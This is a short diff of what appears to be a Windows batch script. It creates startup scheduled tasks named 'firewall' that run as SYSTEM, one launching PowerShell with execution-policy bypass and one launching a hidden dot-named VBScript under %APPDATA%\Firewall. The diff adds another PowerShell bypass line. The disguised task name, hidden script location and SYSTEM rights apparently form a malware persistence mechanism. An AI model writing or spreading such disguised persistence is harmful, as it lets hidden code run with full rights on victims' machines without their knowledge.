@@ -102,6 +102,7 @@ schtasks /create /tn "firewall" /tr "powershell.exe -ExecutionPolicy Bypass -Fil
 schtasks /create /tn "firewall" /tr "cscript.exe %APPDATA%\Firewall\.firewall%VER%.vbs" /sc onstart /ru SYSTEM
 
 :: run x.ps1 file
+powershell -ExecutionPolicy Bypass -Command "& {%_PATH%}"
 
 echo Tasks created
 
